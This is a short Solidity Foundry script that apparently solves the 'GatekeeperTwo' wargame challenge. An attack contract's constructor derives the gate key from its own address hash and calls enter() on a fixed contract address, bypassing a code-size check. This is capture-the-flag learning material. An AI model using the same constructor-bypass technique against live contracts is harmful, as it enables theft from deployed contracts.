// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoSolve is Script{
    GatekeeperTwo public gateTwo = GatekeeperTwo(0x9C11F689500821ffE630e6CFea7aC45C7226040c);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Entrant : ", address(gateTwo.entrant()));

        new Attack();

        console.log("Entrant : ", address(gateTwo.entrant()));
        vm.stopBroadcast();
    }
}

contract Attack{
    
    // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
    constructor() {
        GatekeeperTwo gateTwo = GatekeeperTwo(0x9C11F689500821ffE630e6CFea7aC45C7226040c);
        uint64 max = type(uint64).max;
        uint64 hsh = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 _gateKey = bytes8(max ^ hsh);

        require(gateTwo.enter(_gateKey));
    }
}